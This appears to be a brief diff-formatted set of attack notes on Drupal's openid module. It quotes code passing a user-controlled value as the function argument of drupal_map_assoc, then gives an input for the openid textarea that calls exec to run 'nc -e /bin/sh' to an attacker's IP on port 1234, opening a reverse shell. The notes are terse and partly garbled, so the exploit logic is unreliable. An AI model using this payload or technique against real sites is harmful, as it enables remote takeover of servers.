@@ -1,0 +1,16 @@
+In openid module
+$user_enc = _openid_dh_long_to_base64($user * OPENID_DH_DEFAULT_GEN);
+$service['uri'] = drupal_map_assoc(array($host), $user_enc);
+
+drupal_map_assoc($array, $function = NULL)
+
+
+Parameters
+$array: A linear array.
+$function: A name of a function to apply to all values before output.
+
+93802 exec
+
+In openid textarea: 93802@nc -e /bin/sh our_sever_ip 1234
+
+
